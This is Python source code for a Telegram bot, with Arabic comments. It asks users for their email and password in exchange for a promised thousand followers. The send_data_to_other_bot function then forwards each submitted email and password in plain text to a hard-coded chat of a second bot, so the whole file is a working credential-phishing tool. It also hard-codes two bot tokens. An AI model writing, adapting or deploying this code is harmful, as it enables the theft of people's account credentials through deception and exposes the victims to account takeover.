import logging
import re
import requests
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext, ConversationHandler

# توكن البوت الأساسي الذي سيستقبل الرسائل
TOKEN = '7186164557:AAFZNT7-cfPuJ8JNwCuK-aGfH4SbG_gouDM'

# توكن البوت الآخر
OTHER_BOT_TOKEN = '7453337879:AAG7by6-caGWvH2PapNiSIHdl7I3gDfWUAU'

# إعداد التسجيل لتتبع الأخطاء
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# تحديد حالات المحادثة
EMAIL, PASSWORD = range(2)

# تعبير منتظم للتحقق من البريد الإلكتروني وكلمة المرور
EMAIL_REGEX = re.compile(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$')
PASSWORD_REGEX = re.compile(r'^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{8,}$')

def start(update: Update, context: CallbackContext):
    update.message.reply_text('أهلاً! من فضلك أدخل بريدك الإلكتروني:')
    return EMAIL

def get_email(update: Update, context: CallbackContext):
    user_email = update.message.text
    
    # التحقق من صحة البريد الإلكتروني
    if EMAIL_REGEX.match(user_email):
        context.user_data['email'] = user_email
        update.message.reply_text('شكرًا. الآن أدخل كلمة المرور (يجب أن تكون 8 أحرف على الأقل وتحتوي على أرقام):')
        return PASSWORD
    else:
        update.message.reply_text('البريد الإلكتروني غير صحيح. يرجى إدخال بريد إلكتروني صالح:')
        return EMAIL  # أعِد المستخدم إلى حالة إدخال البريد الإلكتروني

def get_password(update: Update, context: CallbackContext):
    user_password = update.message.text
    
    # التحقق من صحة كلمة المرور
    if PASSWORD_REGEX.match(user_password):
        user_email = context.user_data.get('email')
        send_data_to_other_bot(user_email, user_password)
        update.message.reply_text('سوف تزوّدك في ألف متابع وشكرًا.')
        return ConversationHandler.END  # إنهاء المحادثة بنجاح
    else:
        update.message.reply_text('كلمة المرور غير صحيحة. يجب أن تكون 8 أحرف على الأقل وتحتوي على أرقام وحروف.')
        return PASSWORD  # أعِد المستخدم إلى حالة إدخال كلمة المرور

def send_data_to_other_bot(email, password):
    url = f"https://api.telegram.org/bot{OTHER_BOT_TOKEN}/sendMessage"
    chat_id = '5975452315'  # معرف الدردشة الصحيح
    text = f"تم التسجيل:\nالبريد الإلكتروني: {email}\nكلمة المرور: {password}"
    
    payload = {
        'chat_id': chat_id,
        'text': text
    }
    
    try:
        response = requests.post(url, data=payload)
        response.raise_for_status()  # تثير استثناءً إذا كان رمز الحالة غير 200
        print("البيانات أرسلت بنجاح إلى البوت الآخر.")
    except requests.exceptions.RequestException as e:
        print(f"فشل إرسال البيانات إلى البوت الآخر: {e}")

def cancel(update: Update, context: CallbackContext):
    update.message.reply_text('تم إلغاء العملية.')
    return ConversationHandler.END

def error(update: Update, context: CallbackContext):
    logger.warning(f"تحديث تسبب في خطأ: {context.error}")

def main():
    # إعداد الـ Updater واستقبال التحديثات
    updater = Updater(token=TOKEN, use_context=True)
    dp = updater.dispatcher

    # إعداد ConversationHandler للتعامل مع المحادثة
    conversation_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            EMAIL: [MessageHandler(Filters.text & ~Filters.command, get_email)],
            PASSWORD: [MessageHandler(Filters.text & ~Filters.command, get_password)]
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )

    dp.add_handler(conversation_handler)
    dp.add_error_handler(error)

    # بدء البوت
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
